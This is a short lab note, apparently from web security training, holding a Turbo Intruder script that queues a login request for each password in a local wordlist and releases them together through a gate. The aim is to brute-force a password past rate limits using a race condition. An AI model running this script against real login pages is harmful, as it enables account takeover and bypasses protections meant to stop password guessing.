# LAB: Bypassing rate limits via race conditions
## Turbo Intruder script
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    for password in open('D:\Security document\VCS\Web Security Training\VCS_Training\WEB_05\password.txt'):
        engine.queue(target.req, password.rstrip(), gate='brute')

    engine.openGate('brute')



def handleResponse(req, interesting):
    table.add(req)